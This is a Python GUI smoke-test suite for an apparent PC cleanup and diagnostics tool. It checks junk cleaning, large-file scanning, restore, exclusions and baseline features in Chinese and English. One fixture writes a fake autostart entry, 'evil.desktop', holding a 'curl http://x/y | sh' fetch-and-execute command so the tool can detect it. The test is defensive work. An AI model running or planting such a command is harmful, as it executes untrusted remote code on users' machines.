# -*- coding: utf-8 -*-
"""界面冒烟测试：用假 tkinter 把诊断中心、各页签、动作按钮真正跑一遍（中文 + 英文）。python -m unittest discover -s tests"""
import os
import sys
import json
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
TESTS = Path(__file__).resolve().parent

PRELUDE = f"""
import sys, os, json, time, re
sys.path.insert(0, {str(ROOT)!r}); sys.path.insert(0, {str(TESTS)!r})
import fake_tk; fake_tk.install()
import faster_gui as g, faster_crypto as fc, faster as core, faster_diag as fd
core.send2trash = None                                    # 强制使用工具回收站（CI 上装了 send2trash 的话会走系统回收站）
app = g.App()
def drain(limit=400):
    for _ in range(limit):
        time.sleep(0.05); app.poll()
        if app.busy_n == 0: return
H = os.environ["HOME"]
old = time.time() - 7200
def mk(p, size, age=old):
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "wb") as f: f.write(b"z" * size)
    os.utime(p, (age, age))
if sys.platform.startswith("win"): JD = os.environ["TEMP"]                 # 各系统的“用户垃圾”目录
elif sys.platform == "darwin": JD = H + "/Library/Caches/x"
else: JD = H + "/.cache/x"
CJK = re.compile(r"[\\u4e00-\\u9fff]")
"""


def run_flow(code, lang):
    with tempfile.TemporaryDirectory() as h:
        env = dict(os.environ, HOME=h, USERPROFILE=h, FASTER_LANG=lang, PYTHONIOENCODING="utf-8", PYTHONUTF8="1",
                   TEMP=os.path.join(h, "Temp"), TMP=os.path.join(h, "Temp"), LOCALAPPDATA=os.path.join(h, "AppData", "Local"))
        for k in ("OneDrive", "OneDriveConsumer", "OneDriveCommercial"):
            env.pop(k, None)
        r = subprocess.run([sys.executable, "-c", PRELUDE + code], capture_output=True, encoding="utf-8", errors="replace",
                           cwd=str(ROOT), env=env, timeout=240)
        assert r.returncode == 0, r.stderr[-3000:]
        return json.loads(r.stdout.strip().splitlines()[-1])


DIAG_FLOW = """
mk(JD + "/a.bin", 3000000); mk(JD + "/b.bin", 3000000)
mk(H + "/OneDrive/wallet.dat", 10)
os.makedirs(H + "/.config/autostart", exist_ok=True)
open(H + "/.config/autostart/evil.desktop", "w").write("[Desktop Entry]\\nName=evil\\nExec=sh -c 'curl http://x/y | sh'\\n")
fd.GB = 1024                                              # 让很小的测试数据也触发“垃圾太多”
fd.system_trash_size = lambda: 600 << 20                  # 假装回收站里有 600MB
fc.download_wordlist = lambda: (True, "ok")               # 不真的联网
d = app.tabs["diag"].subtabs["findings"]
d.scan(); drain()
r = app.diag
acts = [(f["key"], a) for f in r["findings"] for a in f["actions"]]
d.render(); d.show_ok.set(True); d.render(); d.show_ok.set(False)
panels = sorted({v.__self__.page for v in app.views if getattr(getattr(v, "__self__", None), "page", None)})   # app.views 里是各面板的 refresh 方法
for key, a in acts:
    if a["op"] in ("kill_pid", "open_settings", "open_system_trash", "open_folder"): continue   # 不在测试里真的结束进程/开窗口
    app.run_action(a); drain()
done_ops = sorted({a["op"] for _, a in acts if a["done"]})
d.deep.set(True); d.scan(); drain(); deep_n = len(app.diag["findings"])
d.scan(); app.cancel_task(); drain(); busy = app.busy_n
cjk = sorted({x for x in fake_tk.SEEN if CJK.search(x)})
print(json.dumps(dict(cats=sorted(r["cats"]), ops=sorted({a["op"] for _, a in acts}), done=done_ops, panels=panels,
                      deep=deep_n, busy=busy, n=len(r["findings"]), cjk=cjk, score=r["score"])))
"""

TABS_FLOW = """
mk(JD + "/a.bin", 3000000); mk(H + "/proj/sub/big.dat", 3000000); mk(H + "/proj/sub/big2.dat", 3000000)
def pick_all(t): t.selected = lambda: list(t.data.items())
out = {}
t = app.tabs["junk"]; t.scan(); drain(); out["junk_before"] = len(t.data); pick_all(t); t.clean(); drain(); out["junk_after"] = len(t.data)
t = app.tabs["large"]; t.root_var.set(H + "/proj"); t.mb.set("1"); t.scan(); drain(); out["large"] = len(t.data); pick_all(t); t.delete(); drain()
t = app.tabs["restore"]; t.load(); out["restore_rows"] = len(t.data); pick_all(t)
first = [o for o in t.data.values() if o[0] == "tool"][:1]
t.selected = lambda: [(i, o) for i, o in t.data.items() if o in first]; t.restore()
out["restored_exists"] = os.path.exists(first[0][1]["orig"])
t.load(); pick_all(t); t.delete_forever(); t.empty(); t.load(); out["restore_after"] = len(t.data)
t = app.tabs["diag"].subtabs["compare"]; t.record(); t.load(); out["history"] = len(t.data); pick_all(t); t.compare_sel(); t.clear_hist(); out["history_after"] = len(t.data)
t = app.tabs["large"]; t.root_var.set(H); t.scan(); app.cancel_task(); drain(); out["busy"] = app.busy_n
out["cjk"] = sorted({x for x in fake_tk.SEEN if CJK.search(x)})
print(json.dumps(out))
"""

V04_FLOW = '\nclass FL:                                                  # 一个真正能存东西的假 Listbox\n    def __init__(self): self.items = []\n    def insert(self, _pos, v): self.items.append(v)\n    def get(self, a, b=None): return list(self.items)\n    def curselection(self): return list(range(len(self.items)))\n    def delete(self, i): del self.items[i]\n    def pack(self, *a, **k): pass\ndef pick_all(t): t.selected = lambda: list(t.data.items())\nout = {}\nmk(H + "/proj/a/v.mp4", 3000000); mk(H + "/proj/a/p.jpg", 3000000); mk(H + "/proj/b/doc.bin", 3000000); mk(H + "/proj/b/c/other.bin", 3000000)\nL = app.tabs["large"]; L.root_var.set(H + "/proj"); L.mb.set("1")\nL.scan(); drain(); out["large_all"] = len(L.data)\nL.excl.vars["video"].set(True); L.excl.save(); L.scan(); drain(); out["large_no_video"] = len(L.data)\nL.excl.vars["image"].set(True); L.excl.save(); L.scan(); drain(); out["large_no_video_image"] = len(L.data)\nL.excl.box = FL(); sys.modules["tkinter.filedialog"].askdirectory = lambda **k: H + "/proj/b"\nL.excl.add_folder(); L.scan(); drain(); out["large_no_folder"] = len(L.data)\nout["saved"] = core.exclusion_config("large")\nout["dup_unaffected"] = core.exclusion_config("dup")\nL.excl.remove(); out["after_remove"] = core.exclusion_config("large")["folders"]\nD = app.tabs["dup"]; D.excl.vars["archive"].set(True); D.excl.save(); out["dup_saved"] = core.exclusion_config("dup")["groups"]\nD.root_var.set(H + "/proj"); D.scan(); drain(); out["dup_rows"] = len(D.data)\nhub = app.tabs["diag"].subtabs\nS = hub["sig"]; S.scan(); drain(); out["sig_rows"] = len(S.data); pick_all(S); S.copy_hash(); S.reveal()\nB = hub["baseline"]; B.compare(); drain(); out["baseline_none"] = bl_load_is_none = (__import__("faster_baseline").load() is None)\nB.set_baseline(); drain(); out["baseline_set"] = __import__("faster_baseline").load() is not None\nB.compare(); drain(); out["baseline_rows_same"] = len(B.data)\nopen(H + "/.hosts_test", "w").write("x")\nB.accept(); drain()\nHd = hub["harden"]; Hd.scan(); drain(); out["harden_rows"] = len(Hd.data); pick_all(Hd); Hd.fix()\napp.op_copy_text({}, {"text": "abc", "note": "ok"})\nout["messages"] = len(fake_tk.MESSAGES)\nout["cjk"] = sorted({x for x in fake_tk.SEEN if CJK.search(x)})\nprint(json.dumps(out))\n'

ALLOWED_CJK_IN_EN = {"Language / 语言: ", "简体中文"}


class GuiSmoke(unittest.TestCase):
    def test_diagnosis_center_zh(self):
        r = run_flow(DIAG_FLOW, "zh")
        self.assertEqual(r["cats"], ["harden", "perf", "security", "storage", "wallet"])
        self.assertIn("empty_trash", r["ops"])
        self.assertIn("goto", r["ops"])
        self.assertIn("empty_trash", r["done"])
        self.assertIn("set_baseline", r["ops"])                     # 还没有基线时，诊断会建议先建立
        self.assertIn("set_baseline", r["done"])
        self.assertIn("clean_junk", r["ops"])
        self.assertIn("clean_junk", r["done"])
        if sys.platform.startswith("linux"):                       # 可疑启动项用 Linux 的 autostart 文件模拟
            self.assertIn("disable_startup", r["ops"])
            self.assertIn("disable_startup", r["done"])
        for page in ("junk", "startup", "impact", "proc", "restore", "security", "wallet", "sig", "baseline", "harden"):
            self.assertIn(page, r["panels"])                  # 这些页面顶部都挂了“建议操作”面板
        self.assertGreater(r["deep"], r["n"] - 5)
        self.assertEqual(r["busy"], 0)

    def test_diagnosis_center_en_has_no_chinese(self):
        r = run_flow(DIAG_FLOW, "en")
        self.assertEqual(r["cats"], ["harden", "perf", "security", "storage", "wallet"])
        self.assertIn("clean_junk", r["done"])
        self.assertEqual(r["busy"], 0)
        self.assertEqual([x for x in r["cjk"] if x not in ALLOWED_CJK_IN_EN], [])

    def test_other_tabs_zh(self):
        r = run_flow(TABS_FLOW, "zh")
        self.assertGreaterEqual(r["junk_before"], 1)
        self.assertLessEqual(r["junk_after"], r["junk_before"])
        self.assertEqual(r["large"], 2)
        self.assertEqual(r["restore_rows"], 2)
        self.assertTrue(r["restored_exists"])
        self.assertEqual(r["restore_after"], 0)
        self.assertEqual((r["history"], r["history_after"]), (3, 0))      # 清理前后各 1 条 + 手动记录 1 条
        self.assertEqual(r["busy"], 0)

    def test_v04_exclusions_and_new_tabs_zh(self):
        r = run_flow(V04_FLOW, "zh")
        self.assertEqual(r["large_all"], 4)
        self.assertEqual(r["large_no_video"], 3)                  # 排除“视频”后少了 .mp4
        self.assertEqual(r["large_no_video_image"], 2)            # 再排除“图片”后少了 .jpg
        self.assertEqual(r["large_no_folder"], 0)                 # 再排除 proj/b 文件夹（含子文件夹）后只剩 0 个
        self.assertEqual(r["saved"]["groups"], ["video", "image"])
        self.assertEqual(len(r["saved"]["folders"]), 1)
        self.assertEqual(r["dup_unaffected"], {})                 # 大文件页的设置不影响重复文件页
        self.assertEqual(r["after_remove"], [])
        self.assertEqual(r["dup_saved"], ["archive"])
        self.assertTrue(r["baseline_none"])
        self.assertTrue(r["baseline_set"])
        self.assertEqual(r["baseline_rows_same"], 0)
        self.assertGreaterEqual(r["messages"], 1)

    def test_v04_new_tabs_en_has_no_chinese(self):
        r = run_flow(V04_FLOW, "en")
        self.assertEqual(r["large_no_video"], 3)
        self.assertEqual([x for x in r["cjk"] if x not in ALLOWED_CJK_IN_EN], [])

    def test_other_tabs_en_has_no_chinese(self):
        r = run_flow(TABS_FLOW, "en")
        self.assertEqual(r["large"], 2)
        self.assertEqual([x for x in r["cjk"] if x not in ALLOWED_CJK_IN_EN], [])


if __name__ == "__main__":
    unittest.main()
